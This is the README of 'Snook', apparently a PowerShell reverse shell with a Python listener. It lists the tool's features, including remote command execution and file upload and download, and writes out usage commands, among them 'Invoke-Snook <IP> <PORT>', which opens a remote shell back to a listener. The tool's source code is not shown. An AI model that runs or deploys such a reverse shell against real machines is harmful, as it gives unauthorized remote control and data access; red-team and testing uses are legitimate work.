# Snook
Enhanced PowerShell reverse shell with python listener

## Dependencies

The python listener needs:

- colorama
- alive-progress

Both can be installed with pip. However, they are not crucial dependencies so if you do not want to install them you can modify the code of snook_listener.py.

The reverse shell has only been tested on PowerShell 5.1.

## Features

- Execute commands
- Download a file from the remote host
- Upload a file to the remote host

## Usage

On your machine, set up the listener:

`python3 snook_listener.py -H <IP> -p <PORT>`

Then run the reverse shell on the remote machine:

`. .\snook.ps1 ; Invoke-Snook <IP> <PORT>`

## TODO

- Add file logging
- Add new cool features
- Check if reverse shell is compatible with other PS versions
